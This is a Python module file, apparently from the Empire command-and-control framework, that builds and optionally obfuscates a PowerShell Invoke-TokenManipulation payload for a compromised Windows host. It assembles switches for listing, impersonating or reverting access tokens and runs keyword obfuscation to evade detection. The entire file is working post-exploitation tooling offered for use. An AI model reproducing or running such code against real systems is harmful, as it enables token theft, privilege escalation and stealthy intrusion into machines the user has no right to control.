from __future__ import print_function

from builtins import object
from builtins import str
from typing import Dict

from empire.server.common import helpers
from empire.server.common.module_models import PydanticModule
from empire.server.utils import data_util
from empire.server.utils.module_util import handle_error_message


class Module(object):
    @staticmethod
    def generate(main_menu, module: PydanticModule, params: Dict, obfuscate: bool = False, obfuscation_command: str = ""):
        
        # read in the common module source code
        module_source = main_menu.installPath + "/data/module_source/credentials/Invoke-TokenManipulation.ps1"
        if obfuscate:
            data_util.obfuscate_module(moduleSource=module_source, obfuscationCommand=obfuscation_command)
            module_source = module_source.replace("module_source", "obfuscated_module_source")
        try:
            f = open(module_source, 'r')
        except:
            return handle_error_message("[!] Could not read module source path at: " + str(module_source))

        module_code = f.read()
        f.close()

        script = module_code

        script_end = "Invoke-TokenManipulation"

        outputf = params.get("OutputFunction", "Out-String")

        if params['RevToSelf'].lower() == "true":
            script_end += " -RevToSelf"
        elif params['WhoAmI'].lower() == "true":
            script_end += " -WhoAmI"
        elif params['ShowAll'].lower() == "true":
            script_end += " -ShowAll"
            script_end += f" | {outputf} | " + '%{$_ + \"`n\"};"`n' + str(module.name.split("/")[-1]) + ' completed!"'
        else:
            for option, values in params.items():
                if option.lower() != "agent" and option.lower() != "outputfunction":
                    if values and values != '':
                        if values.lower() == "true":
                            # if we're just adding a switch
                            script_end += " -" + str(option)
                        else:
                            script_end += " -" + str(option) + " " + str(values)

            # try to make the output look nice
            if script.endswith("Invoke-TokenManipulation") or script.endswith("-ShowAll"):
                script_end += "| Select-Object Domain, Username, ProcessId, IsElevated, TokenType | ft -autosize"
                script_end += f" | {outputf} | " + '%{$_ + \"`n\"};"`n' + str(module.name.split("/")[-1]) + ' completed!"'
            else:
                script_end += f" | {outputf} | " + '%{$_ + \"`n\"};"`n' + str(module.name.split("/")[-1]) + ' completed!"'
                if params['RevToSelf'].lower() != "true":
                    script_end += ';"`nUse credentials/tokens with RevToSelf option to revert token privileges"'
        if obfuscate:
            script_end = helpers.obfuscate(main_menu.installPath, psScript=script_end, obfuscationCommand=obfuscation_command)
        script += script_end
        script = data_util.keyword_obfuscation(script)

        return script
